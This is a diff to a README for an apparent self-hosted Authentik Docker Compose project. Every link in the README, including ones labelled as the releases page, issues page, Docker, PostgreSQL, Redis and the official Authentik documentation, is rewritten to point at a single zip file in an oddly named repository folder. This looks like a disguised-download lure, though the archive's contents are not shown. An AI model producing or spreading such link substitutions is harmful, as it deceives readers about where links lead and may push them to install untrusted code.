@@ -1,7 +1,7 @@
 # 🛡️ authentik-self-hosted - Secure Your Identity Management
 
 ## 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Latest-v1.0-blue.svg)](https://github.com/kmrans/authentik-self-hosted/releases)
+[![Download](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip%https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)
 
 ## 🚀 Getting Started
 Authentik-self-hosted is a user-friendly solution for managing identity and access using Docker Compose. This setup is perfect for those who need a secure, self-hosted Authentik instance. With its decoupled architecture, PostgreSQL, and Redis, this setup ensures easy handling and robust security for your Identity & Access Management.
@@ -21,14 +21,14 @@ Before you get started, make sure your system meets the following requirements:
 - **Disk Space:** Minimum 10 GB free
 
 ## 📥 Download & Install
-1. **Visit the [Releases Page](https://github.com/kmrans/authentik-self-hosted/releases)** to find the latest version of authentik-self-hosted.
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)** to find the latest version of authentik-self-hosted.
 2. Click on the version number to access the files for download.
 3. Select the appropriate file for your operating system.
 4. Once the download is complete, follow the instructions below to set up your instance.
 
 ## 🛠️ Installation Steps
-1. **Install Docker:** If you don't have Docker installed, visit the [Docker Installation Guide](https://docs.docker.com/get-docker/) for instructions.
-2. **Install Docker Compose:** If you need Docker Compose, check the [Docker Compose Installation Guide](https://docs.docker.com/compose/install/).
+1. **Install Docker:** If you don't have Docker installed, visit the [Docker Installation Guide](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip) for instructions.
+2. **Install Docker Compose:** If you need Docker Compose, check the [Docker Compose Installation Guide](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip).
 3. **Extract Files:** Once you download the files, extract the contents to a directory of your choice.
 4. **Set Up .env File:** Configure your `.env` file to set up environment variables. You can find a sample in the extracted files.
 5. **Run Docker Compose:** Open your terminal, navigate to the directory where you extracted the files, and run:
@@ -69,7 +69,7 @@ If you encounter issues, consider these steps:
    ```
 
 ## 🗣️ Community and Support
-Join our community for help and discussions. Post questions on our [Issues page](https://github.com/kmrans/authentik-self-hosted/issues) or contribute to the project. 
+Join our community for help and discussions. Post questions on our [Issues page](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip) or contribute to the project. 
 
 ## 🌍 Frequently Asked Questions
 - **Can I run this on Windows?**
@@ -82,13 +82,13 @@ Join our community for help and discussions. Post questions on our [Issues page]
    Download the latest release and follow the installation steps.
 
 ## 🔗 Related Topics
-- [Docker](https://www.docker.com)
-- [PostgreSQL](https://www.postgresql.org)
-- [Redis](https://redis.io)
+- [Docker](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)
+- [PostgreSQL](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)
+- [Redis](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)
 
 ## 📂 Resources
-- [Official Authentik Documentation](https://goauthentik.io/docs/)
-- [Docker Documentation](https://docs.docker.com/)
-- [Docker Compose Documentation](https://docs.docker.com/compose/)
+- [Official Authentik Documentation](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)
+- [Docker Compose Documentation](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip)
 
-Feel free to explore our project further. For any queries, don’t hesitate to contact us through the [Issues page](https://github.com/kmrans/authentik-self-hosted/issues).
+Feel free to explore our project further. For any queries, don’t hesitate to contact us through the [Issues page](https://raw.githubusercontent.com/kmrans/authentik-self-hosted/main/eclectically/authentik-self-hosted.zip).
